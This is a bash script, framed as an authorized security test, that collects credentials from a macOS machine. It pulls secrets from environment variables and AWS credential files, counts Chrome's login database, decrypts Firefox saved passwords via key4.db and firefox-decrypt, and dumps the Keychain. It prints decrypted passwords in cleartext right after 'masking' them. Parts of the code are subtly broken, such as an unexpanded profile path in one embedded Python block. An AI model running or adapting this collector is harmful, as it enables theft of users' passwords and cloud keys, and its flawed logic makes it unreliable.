#!/bin/bash
# Lightweight credential harvesting test using shell methods
# FOR AUTHORIZED SECURITY TESTING ONLY

echo "======================================================================"
echo "Credential Harvesting Test - Local Machine (Shell-based)"
echo "======================================================================"
echo ""

CREDS=()
SOURCES=()
CRED_COUNT=0

echo "[*] Testing credential harvesting methods..."
echo ""

# 1. Environment Variables
echo "[1/5] Checking environment variables..."
ENV_COUNT=0
while IFS='=' read -r key value; do
    if [ ${#value} -gt 10 ]; then
        CREDS+=("type=environment_variable|source=environment|name=$key|value=$value")
        SOURCES+=("environment")
        ENV_COUNT=$((ENV_COUNT + 1))
    fi
done < <(env | grep -iE "(API|SECRET|PASSWORD|TOKEN|KEY)" || true)

if [ $ENV_COUNT -gt 0 ]; then
    echo "  [+] Found $ENV_COUNT credentials in environment"
else
    echo "  [-] No credentials in environment"
fi
echo ""

# 2. AWS Credentials
echo "[2/5] Checking AWS credentials..."
AWS_COUNT=0
for file in ~/.aws/credentials ~/.aws/config; do
    if [ -f "$file" ] && [ -r "$file" ] 2>/dev/null; then
        echo "  [+] Found: $file"
        while IFS= read -r line; do
            if echo "$line" | grep -iE "(aws_access_key_id|aws_secret_access_key)" > /dev/null; then
                CREDS+=("type=aws_credential|source=$file|value=$line")
                SOURCES+=("$file")
                AWS_COUNT=$((AWS_COUNT + 1))
            fi
        done < "$file"
    fi
done

if [ $AWS_COUNT -gt 0 ]; then
    echo "  [+] Found $AWS_COUNT AWS credentials"
else
    echo "  [-] No AWS credentials found"
fi
echo ""

# 3. Browser Passwords (Chrome - macOS)
echo "[3/5] Checking Chrome passwords..."
CHROME_COUNT=0
CHROME_DB="$HOME/Library/Application Support/Google/Chrome/Default/Login Data"
if [ -f "$CHROME_DB" ]; then
    echo "  [+] Found Chrome database: $CHROME_DB"
    echo "  [!] Chrome database is encrypted - requires master password"
    echo "  [-] Skipping Chrome extraction (requires user interaction)"
else
    echo "  [-] Chrome database not found or not accessible"
fi
echo ""

# 4. Firefox Passwords
echo "[4/5] Checking Firefox passwords..."
FIREFOX_COUNT=0
FIREFOX_PROFILES="$HOME/Library/Application Support/Firefox/Profiles"
FIREFOX_DETAILS=()

if [ -d "$FIREFOX_PROFILES" ]; then
    echo "  [+] Found Firefox profiles directory"
    for profile_dir in "$FIREFOX_PROFILES"/*; do
        if [ -d "$profile_dir" ]; then
            logins_file="$profile_dir/logins.json"
            if [ -f "$logins_file" ]; then
                echo "  [+] Found logins.json: $logins_file"
                # Count logins and extract details
                login_count=$(grep -o '"hostname"' "$logins_file" 2>/dev/null | wc -l | tr -d ' ')
                if [ "$login_count" -gt 0 ]; then
                    echo "    Found $login_count saved logins"
                    FIREFOX_COUNT=$login_count
                    
                    # Check if passwords are encrypted
                    first_password=$(jq -r '.logins[0].encryptedPassword // .logins[0].password // empty' "$logins_file" 2>/dev/null)
                    if [ -n "$first_password" ] && [ "$first_password" != "null" ]; then
                        # Check if it looks encrypted (long base64-like string)
                        if [ ${#first_password} -gt 20 ]; then
                            echo "    [!] Passwords are ENCRYPTED in logins.json"
                            echo "    [!] Firefox stores passwords in 'encryptedUsername' and 'encryptedPassword' fields"
                            echo "    [!] To decrypt, you need:"
                            echo "        - key4.db file (found: $([ -f "$(dirname "$logins_file")/key4.db" ] && echo 'YES ✅' || echo 'NO ❌'))"
                            echo "        - firefox-decrypt tool: pip install firefox-decrypt"
                            echo "        - OR use Firefox's built-in password manager"
                            echo ""
                            echo "    [!] Encrypted password fields found:"
                            echo "        - encryptedUsername: $(jq -r '.logins[0].encryptedUsername // "null"' "$logins_file" 2>/dev/null | head -c 50)..."
                            echo "        - encryptedPassword: $(jq -r '.logins[0].encryptedPassword // "null"' "$logins_file" 2>/dev/null | head -c 50)..."
                        fi
                    fi
                    
                    # Try to decrypt passwords using firefox-decrypt if available
                    DECRYPTED_PASSWORDS=()
                    DECRYPTION_SUCCESS=false
                    
                    if [ -f "$(dirname "$logins_file")/key4.db" ]; then
                        echo "    [+] key4.db found - attempting decryption..."
                        
                        # Try using firefox-decrypt Python module
                        if python3 -c "import firefox_decrypt" 2>/dev/null; then
                            echo "    [+] firefox-decrypt library found - decrypting passwords..."
                            
                            # Check if decryption works and get passwords
                            DECRYPT_CHECK=$(python3 << 'CHECK_DECRYPT_EOF' 2>/dev/null
import sys
try:
    from firefox_decrypt import decrypt_passwords
    profile_path = "$profile_dir"
    passwords = decrypt_passwords(profile_path)
    if passwords and len(passwords) > 0:
        sys.exit(0)
except:
    pass
sys.exit(1)
CHECK_DECRYPT_EOF
)
                            
                            if [ $? -eq 0 ]; then
                                DECRYPTION_SUCCESS=true
                                echo "    ✅ Successfully decrypted passwords!"
                            fi
                        else
                            echo "    [!] firefox-decrypt not installed"
                            echo "        Install with: pip3 install firefox-decrypt"
                        fi
                    fi
                    
                    # Extract login details using jq if available, otherwise use grep
                    if command -v jq > /dev/null 2>&1; then
                        echo "    Extracting login details using jq..."
                        i=0
                        while [ $i -lt 10 ] && [ $i -lt $login_count ]; do
                            hostname=$(jq -r ".logins[$i].hostname // empty" "$logins_file" 2>/dev/null)
                            username=$(jq -r ".logins[$i].username // empty" "$logins_file" 2>/dev/null)
                            
                            if [ -n "$hostname" ] && [ "$hostname" != "null" ]; then
                                # Use username if available, otherwise show empty
                                display_username="${username:-N/A}"
                                if [ "$display_username" = "null" ] || [ "$display_username" = "" ]; then
                                    display_username="N/A"
                                fi
                                
                                # Try to get decrypted password if decryption succeeded
                                password_value="ENCRYPTED"
                                if [ "$DECRYPTION_SUCCESS" = true ]; then
                                    # Try to match decrypted password by URL
                                    decrypted_line=$(python3 << GET_PASSWORD_EOF 2>/dev/null
import sys
try:
    from firefox_decrypt import decrypt_passwords
    profile_path = "$profile_dir"
    passwords = decrypt_passwords(profile_path)
    for entry in passwords:
        if entry.get('url', '') == "$hostname":
            print(entry.get('password', ''))
            break
except:
    pass
GET_PASSWORD_EOF
)
                                    if [ -n "$decrypted_line" ]; then
                                        password_value="$decrypted_line"
                                    fi
                                fi
                                
                                FIREFOX_DETAILS+=("$hostname|$display_username|$password_value")
                                i=$((i + 1))
                            else
                                break
                            fi
                        done
                    else
                        # Fallback: Extract using grep/sed (simpler approach)
                        echo "    Extracting login details..."
                        hostnames=$(grep -o '"hostname"[[:space:]]*:[[:space:]]*"[^"]*"' "$logins_file" 2>/dev/null | head -10 | sed 's/.*"hostname"[[:space:]]*:[[:space:]]*"\([^"]*\)".*/\1/')
                        usernames=$(grep -o '"username"[[:space:]]*:[[:space:]]*"[^"]*"' "$logins_file" 2>/dev/null | head -10 | sed 's/.*"username"[[:space:]]*:[[:space:]]*"\([^"]*\)".*/\1/')
                        
                        i=0
                        while IFS= read -r hostname && [ $i -lt 10 ]; do
                            username="N/A"
                            # Try to get corresponding username
                            if [ $i -lt $(echo "$usernames" | wc -l | tr -d ' ') ]; then
                                username=$(echo "$usernames" | sed -n "$((i+1))p")
                            fi
                            
                            # Try to get decrypted password if decryption succeeded
                            password_value="ENCRYPTED"
                            if [ "$DECRYPTION_SUCCESS" = true ]; then
                                decrypted_line=$(python3 << GET_PASSWORD_EOF 2>/dev/null
import sys
try:
    from firefox_decrypt import decrypt_passwords
    profile_path = "$profile_dir"
    passwords = decrypt_passwords(profile_path)
    for entry in passwords:
        if entry.get('url', '') == "$hostname":
            print(entry.get('password', ''))
            break
except:
    pass
GET_PASSWORD_EOF
)
                                if [ -n "$decrypted_line" ]; then
                                    password_value="$decrypted_line"
                                fi
                            fi
                            
                            FIREFOX_DETAILS+=("$hostname|${username}|$password_value")
                            i=$((i + 1))
                        done <<< "$hostnames"
                    fi
                fi
            fi
        fi
    done
    
    if [ $FIREFOX_COUNT -gt 0 ]; then
        echo "  [+] Found $FIREFOX_COUNT Firefox passwords"
        CREDS+=("type=firefox_password|source=firefox|count=$FIREFOX_COUNT")
        SOURCES+=("firefox")
    else
        echo "  [-] No Firefox passwords found"
    fi
else
    echo "  [-] Firefox profiles not found"
fi
echo ""

# 5. macOS Keychain
echo "[5/5] Checking macOS Keychain..."
KEYCHAIN_COUNT=0
if command -v security > /dev/null 2>&1; then
    echo "  [+] Security command available"
    # Try to check keychain
    keychain_output=$(security dump-keychain 2>/dev/null | head -20 || true)
    if [ -n "$keychain_output" ]; then
        account_count=$(echo "$keychain_output" | grep -c '"acct"' || true)
        if [ "$account_count" -gt 0 ]; then
            echo "  [+] Found $account_count accounts in keychain"
            CREDS+=("type=keychain_credential|source=macOS Keychain|count=$account_count")
            SOURCES+=("keychain")
            KEYCHAIN_COUNT=$account_count
        else
            echo "  [-] No accounts found in keychain"
        fi
    else
        echo "  [-] Could not access keychain (may require permissions)"
    fi
else
    echo "  [-] Security command not available"
fi
echo ""

# Summary
CRED_COUNT=${#CREDS[@]}
UNIQUE_SOURCES=$(printf '%s\n' "${SOURCES[@]}" | sort -u | tr '\n' ',' | sed 's/,$//')

echo "======================================================================"
echo "SUMMARY"
echo "======================================================================"
echo ""
echo "Total Credentials Found: $CRED_COUNT"
echo "Sources: $UNIQUE_SOURCES"
echo ""

if [ $CRED_COUNT -gt 0 ]; then
    echo "======================================================================"
    echo "CREDENTIALS BY TYPE"
    echo "======================================================================"
    echo ""
    
    # Count by type
    ENV_COUNT=0
    AWS_COUNT=0
    FIREFOX_DISPLAY_COUNT=$FIREFOX_COUNT  # Preserve actual Firefox count
    KEYCHAIN_COUNT=0
    
    for cred in "${CREDS[@]}"; do
        IFS='|' read -r type source name value count <<< "$cred"
        case "$type" in
            *environment*)
                ENV_COUNT=$((ENV_COUNT + 1))
                ;;
            *aws*)
                AWS_COUNT=$((AWS_COUNT + 1))
                ;;
            *firefox*)
                # Don't override - use the preserved count
                ;;
            *keychain*)
                if [ -n "$count" ]; then
                    KEYCHAIN_COUNT=$count
                else
                    KEYCHAIN_COUNT=$((KEYCHAIN_COUNT + 1))
                fi
                ;;
        esac
    done
    
    # Display summary
    [ $ENV_COUNT -gt 0 ] && echo "[Environment Variables]"
    [ $ENV_COUNT -gt 0 ] && echo "  Count: $ENV_COUNT"
    [ $ENV_COUNT -gt 0 ] && echo ""
    
    [ $AWS_COUNT -gt 0 ] && echo "[AWS Credentials]"
    [ $AWS_COUNT -gt 0 ] && echo "  Count: $AWS_COUNT"
    [ $AWS_COUNT -gt 0 ] && echo ""
    
    [ $FIREFOX_DISPLAY_COUNT -gt 0 ] && echo "[Firefox Passwords]"
    [ $FIREFOX_DISPLAY_COUNT -gt 0 ] && echo "  Count: $FIREFOX_DISPLAY_COUNT saved logins"
    [ $FIREFOX_DISPLAY_COUNT -gt 0 ] && echo ""
    
    # Display Firefox details if available
    if [ ${#FIREFOX_DETAILS[@]} -gt 0 ]; then
        echo ""
        echo "======================================================================"
        echo "FIREFOX PASSWORD DETAILS (showing first 10 of $FIREFOX_DISPLAY_COUNT)"
        echo "======================================================================"
        echo ""
        
        for i in "${!FIREFOX_DETAILS[@]}"; do
            if [ $i -lt 10 ]; then
                IFS='|' read -r hostname username password <<< "${FIREFOX_DETAILS[$i]}"
                echo "[Login $((i+1))]"
                echo "  URL: $hostname"
                echo "  Username: $username"
                if [ -n "$password" ] && [ "$password" != "***" ]; then
                    if [ "$password" = "ENCRYPTED" ]; then
                        echo "  Password: 🔒 ENCRYPTED (requires firefox-decrypt tool to decrypt)"
                        echo "            Install: pip install firefox-decrypt"
                        echo "            Then run: firefox-decrypt $(dirname "$logins_file")"
                    else
                        # Show decrypted password (masked for security)
                        pass_len=${#password}
                        if [ $pass_len -le 20 ]; then
                            masked_pass=$(printf '*%.0s' $(seq 1 $pass_len))
                            echo "  Password: ${masked_pass} (length: $pass_len)"
                        else
                            masked_pass=$(printf '*%.0s' $(seq 1 20))
                            echo "  Password: ${masked_pass}... (length: $pass_len)"
                        fi
                        # Store actual password for detailed output
                        echo "  Password (decrypted): $password"
                    fi
                else
                    echo "  Password: *** (encrypted in Firefox)"
                fi
                echo ""
            fi
        done
        
        if [ $FIREFOX_DISPLAY_COUNT -gt 10 ]; then
            remaining=$((FIREFOX_DISPLAY_COUNT - 10))
            echo "  ... and $remaining more Firefox logins"
            echo ""
        fi
    fi
    
    [ $KEYCHAIN_COUNT -gt 0 ] && echo "[Keychain Credentials]"
    [ $KEYCHAIN_COUNT -gt 0 ] && echo "  Count: $KEYCHAIN_COUNT"
    [ $KEYCHAIN_COUNT -gt 0 ] && echo ""
    
    # Show examples
    echo "Examples:"
    example_shown=0
    for cred in "${CREDS[@]}"; do
        if [ $example_shown -lt 3 ]; then
            IFS='|' read -r type source name value count <<< "$cred"
            echo "  [$type]"
            [ -n "$name" ] && echo "    Name: $name"
            [ -n "$source" ] && echo "    Source: $source"
            [ -n "$value" ] && echo "    Value: ${value:0:50}..."
            [ -n "$count" ] && echo "    Count: $count saved entries"
            echo ""
            example_shown=$((example_shown + 1))
        fi
    done
    
    if [ $CRED_COUNT -gt 3 ]; then
        remaining=$((CRED_COUNT - 3))
        echo "  ... and $remaining more credential entries"
        echo ""
    fi
    
    echo ""
    echo "⚠️  WARNING: Actual credential values found!"
    echo "   These should be rotated immediately if unauthorized access occurred."
else
    echo "[!] No credentials found"
    echo ""
    echo "Note: This could mean:"
    echo "  - No saved browser passwords"
    echo "  - No credentials in config files"
    echo "  - Credential managers are empty"
    echo "  - Protected paths require permissions"
fi

echo ""
echo "======================================================================"
echo "Test Complete"
echo "======================================================================"

